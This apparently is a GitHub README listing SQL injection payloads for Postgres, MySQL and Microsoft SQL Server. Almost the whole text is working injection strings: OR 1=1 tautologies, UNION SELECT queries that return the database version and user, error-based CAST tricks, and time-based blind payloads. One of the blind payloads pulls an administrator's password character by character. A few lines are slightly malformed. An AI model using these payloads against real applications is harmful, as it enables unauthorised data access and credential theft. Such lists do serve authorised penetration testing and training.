# WebAppPayloadExamples
Brief example of various common web application vulnerability payloads. 
<h1>Injections</h1>
'||(SELECT%2bcase+when+substring(version(),1,1)%3d'5'+then+sleep(10)+else+sleep(0)+end+from+dual)||'
  <ul>
') OR 1=1 -- 

') OR ('a)'='a)

') OR 1=1 -- 

') UNION SELECT ALL @@version, system_user; -

') UNION SELECT user, 'b' --

<b>Postgress</b>

' OR 'a%'='a%

"' AND CAST(version() AS INT)=1 --"

'||(SELECT 'Shipping')||'

'||(SELECT version())||'

'||(SELECT user)||'

' UNION SELECT user, version() --

') UNION SELECT user, version() --

' UNION SELECT user, 'b' --

' UNION SELECT CAST(version() AS INT) --

Ste'||'ven

'||ver||'

'||(SELECT CASE WHEN SUBSTR(user, 1, 1) = 'n' THEN pg_sleep(10) ELSE pg_sleep(0) END)||'

||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND SUBSTRING(Password, 1, 1) = 'a')--

'||(SELECT CASE WHEN SUBSTR(user, 1, 1) = 'n' THEN pg_sleep(10) ELSE pg_sleep(0) END)||

<b>mysql</b>
Integer
') UNION SELECT user, version() --

100) UNION SELECT …
100 OR 1=1 --
100) OR 1=1 --
100 UNION SELECT user, 'b' --



1 OR 1=1
1 OR 'a'='a' -- 
(SELECT 3+3)
(SELECT CASE WHEN 1=1 THEN 1 ELSE 6 END)
(SELECT CASE WHEN SUBSTRING(@@version, 1, 1)='M' THEN 1 ELSE 2 END)
[IF ERRORS RETURNED]: (SELECT CASE WHEN convert(int,(SELECT @@version))=1 THEN 1 ELSE 2 END)

Integer MySQL
(SELECT CASE WHEN SUBSTRING(user(), 1, 1)='n' THEN 1 ELSE 9 END)-- -
(SELECT IF(SUBSTRING(@@version, 1, 1)='5',1,2))
't' OR (SELECT CASE WHEN substring(user() ,1,1)='n' THEN 1 ELSE 'error' END)
IF(SUBSTRING(@@version, 1, 1)='5',1,6)
(SELECT IF(1=1,1,2))
(SELECT IF(SUBSTRING(@@version, 1, 1)='5',1,2))

<b>Microsoft</b>
Microsoft SQL Displayed

'+(SELECT @@version)+'

Ship'+'ping

'+(SELECT 'Shipping')+'

'+(SELECT CURRENT_USER)+'

' OR 1=1 UNION SELECT USER, @@version --

INTEGER
100+OR++UNION+SELECT+user,+version()+--
(100)UNION+SELECT+@@version,user+--


Microsoft Blind

'+(SELECT CASE WHEN 1=1 THEN 'Shipping' ELSE 'NotADepartment' END)+'

'+(SELECT CASE WHEN SUBSTRING(@@version, 1, 1)='M' THEN 'Steven' ELSE 'notbob' END)+'

[IF ERRORS RETURNED]: '+(SELECT CASE WHEN convert(int,(SELECT @@version))=1 THEN 1 ELSE 2 END)+'

'+(SELECT CASE WHEN 1=1 THEN 'Steven" ELSE 'none' END)-- -

SELECT CAST((SELECT CURRENT_USER) AS int)

  </ul>
